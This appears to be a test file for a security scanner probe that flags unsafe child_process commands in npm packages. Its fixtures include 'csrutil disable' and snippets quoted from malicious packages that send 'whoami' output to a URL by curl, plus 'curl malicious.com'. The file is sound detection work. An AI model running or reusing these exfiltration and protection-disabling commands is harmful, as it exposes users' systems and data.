// Import Node.js Dependencies
import assert from "node:assert/strict";
import { test } from "node:test";

// Import Internal Dependencies
import isUnsafeCommand from "../../src/probes/isUnsafeCommand.ts";
import { getSastAnalysis, parseScript } from "../utils/index.ts";

// CONSTANTS
const kWarningUnsafeCommand = "unsafe-command";

// Command types to test
const COMMAND_TYPES = ["spawn", "spawnSync", "exec", "execSync"];

test("should detect csrutil command", () => {
  COMMAND_TYPES.forEach((cmdType) => {
    const isArrayBased = cmdType === "spawn" || cmdType === "spawnSync";
    const args = isArrayBased ? `"csrutil", ["status"]` : `"csrutil status"`;

    const str = `
      const { ${cmdType} } = require("child_process");
      ${cmdType}(${args});
    `;

    const ast = parseScript(str);
    const sastAnalysis = getSastAnalysis(isUnsafeCommand)
      .execute(ast.body);

    const result = sastAnalysis.getWarning(kWarningUnsafeCommand);
    assert.ok(result);
    assert.equal(result.kind, kWarningUnsafeCommand);
    assert.equal(result.value, "csrutil status");
  });
});

// TODO: de-skip when the tracer would be ready
test.skip("should detect hidden csrutil command", () => {
  COMMAND_TYPES.forEach((cmdType) => {
    const isArrayBased = cmdType === "spawn" || cmdType === "spawnSync";
    const args = isArrayBased ? `"csrutil", ["status"]` : `"csrutil status"`;

    const str = `
      const { ${cmdType}: hide } = require("child_process");
      hide(${args});
    `;

    const ast = parseScript(str);
    const sastAnalysis = getSastAnalysis(isUnsafeCommand)
      .execute(ast.body);

    const result = sastAnalysis.getWarning(kWarningUnsafeCommand);
    assert.ok(result);
    assert.equal(result.kind, kWarningUnsafeCommand);
    assert.equal(result.value, "csrutil status");
  });
});

test("should detect csrutil command with require", () => {
  COMMAND_TYPES.forEach((cmdType) => {
    const isArrayBased = cmdType === "spawn" || cmdType === "spawnSync";
    const args = isArrayBased ? `"csrutil", ["disable"]` : `"csrutil disable"`;

    const str = `
      require("child_process").${cmdType}(${args});
    `;

    const ast = parseScript(str);
    const sastAnalysis = getSastAnalysis(isUnsafeCommand)
      .execute(ast.body);

    const result = sastAnalysis.getWarning(kWarningUnsafeCommand);
    assert.ok(result);
    assert.equal(result.kind, kWarningUnsafeCommand);
    assert.equal(result.value, "csrutil disable");
  });
});

test("should transform template literal arg who are to template literal to literal", () => {
  const code = `
    require('child_process').exec(\`curl -X POST -d \${somevar} "$(whoami)" \${anotherVar} <URL>/c\`);
  `;

  const ast = parseScript(code);
  const sastAnalysis = getSastAnalysis(isUnsafeCommand)
    .execute(ast.body);

  const result = sastAnalysis.warnings();
  assert.equal(result.at(0).kind, kWarningUnsafeCommand);
  assert.equal(result.at(0).value, `curl -X POST -d \${${0}} "$(whoami)" \${${1}} <URL>/c`);
});

test("should not detect non suspicious command", () => {
  COMMAND_TYPES.forEach((cmdType) => {
    const isArrayBased = cmdType === "spawn" || cmdType === "spawnSync";
    const args = isArrayBased ? `"ls", ["-la"]` : `"ls -la"`;

    const str = `
      const { ${cmdType} } = require("child_process");
      ${cmdType}(${args});
    `;

    const ast = parseScript(str);
    const sastAnalysis = getSastAnalysis(isUnsafeCommand)
      .execute(ast.body);

    assert.equal(sastAnalysis.warnings().length, 0);
  });
});

// Note: Until we can safely test with actual malware samples,
// these tests uses a truncated snippet from a known malicious package.

test("aog-checker detection", () => {
  // Ref: https://socket.dev/npm/package/aog-checker/files/99.99.99/index.js
  const maliciousCode = `
	  const { execSync } = require("child_process");
    // truncated ...
    let uname = "";
    try {
      uname = execSync("uname -a").toString().trim();
    } catch (e) {
      uname = "N/A";
    }
  `;

  const ast = parseScript(maliciousCode);
  const sastAnalysis = getSastAnalysis(isUnsafeCommand)
    .execute(ast.body);

  const result = sastAnalysis.getWarning(kWarningUnsafeCommand);
  assert.ok(result);
  assert.equal(result.kind, kWarningUnsafeCommand);
  assert.equal(result.value, "uname -a");
});

test("mydummyproject-zyp detection", () => {
  // Ref: https://socket.dev/npm/package/mydummyproject-zyp/files/99.9.9/index.js
  const maliciousCode = `
    require('child_process').exec('ping -c 4 <URL>');
    require('child_process').exec(\`curl -X POST -d "$(whoami)" <URL>/c\`);
    require('child_process').exec(\`curl "<URL>/c?user=$(whoami)"\`);
  `;

  const ast = parseScript(maliciousCode);
  const sastAnalysis = getSastAnalysis(isUnsafeCommand)
    .execute(ast.body);

  const result = sastAnalysis.warnings();
  assert.ok(result);
  const w1 = result.at(0);
  assert.ok(w1);
  assert.equal(w1.kind, kWarningUnsafeCommand);
  assert.equal(w1.value, "ping -c 4 <URL>");

  const w2 = result.at(1);
  assert.ok(w2);
  assert.equal(w2.kind, kWarningUnsafeCommand);
  assert.equal(w2.value, "curl -X POST -d \"$(whoami)\" <URL>/c");

  const w3 = result.at(2);
  assert.ok(w3);
  assert.equal(w3.kind, kWarningUnsafeCommand);
  assert.equal(w3.value, "curl \"<URL>/c?user=$(whoami)\"");
});

test("conservative mode: should not detect ls command", () => {
  const str = `
    const { spawn } = require("child_process");
    spawn("ls", ["-la"]);
  `;

  const ast = parseScript(str);
  const sastAnalysis = getSastAnalysis(isUnsafeCommand, { sensitivity: "conservative" })
    .execute(ast.body);

  assert.equal(sastAnalysis.warnings().length, 0);
});

test("aggressive mode: should detect all child_process usage (ls)", () => {
  const str = `
    const { exec } = require("child_process");
    exec("ls -la");
  `;

  const ast = parseScript(str);
  const sastAnalysis = getSastAnalysis(isUnsafeCommand, { sensitivity: "aggressive" })
    .execute(ast.body);

  const warnings = sastAnalysis.warnings();
  assert.equal(warnings.length, 1);
  assert.equal(warnings[0].kind, kWarningUnsafeCommand);
  assert.equal(warnings[0].value, "ls -la");
});

test("aggressive mode: should detect echo command", () => {
  const str = `
    const child_process = require("child_process");
    child_process.exec("echo hello");
  `;

  const ast = parseScript(str);
  const sastAnalysis = getSastAnalysis(isUnsafeCommand, { sensitivity: "aggressive" })
    .execute(ast.body);

  const warnings = sastAnalysis.warnings();
  assert.equal(warnings.length, 1);
  assert.equal(warnings[0].kind, kWarningUnsafeCommand);
  assert.equal(warnings[0].value, "echo hello");
});

test("aggressive mode: should still detect curl command", () => {
  const str = `
    const { exec } = require("child_process");
    exec("curl malicious.com");
  `;

  const ast = parseScript(str);
  const sastAnalysis = getSastAnalysis(isUnsafeCommand, { sensitivity: "aggressive" })
    .execute(ast.body);

  const warnings = sastAnalysis.warnings();
  assert.equal(warnings.length, 1);
  assert.equal(warnings[0].kind, kWarningUnsafeCommand);
  assert.equal(warnings[0].value, "curl malicious.com");
});

test("aggressive mode: should handle spawn with array arguments", () => {
  const str = `
    const { spawn } = require("child_process");
    spawn("node", ["--version"]);
  `;

  const ast = parseScript(str);
  const sastAnalysis = getSastAnalysis(isUnsafeCommand, { sensitivity: "aggressive" })
    .execute(ast.body);

  const warnings = sastAnalysis.warnings();
  assert.equal(warnings.length, 1);
  assert.equal(warnings[0].kind, kWarningUnsafeCommand);
  assert.equal(warnings[0].value, "node --version");
});
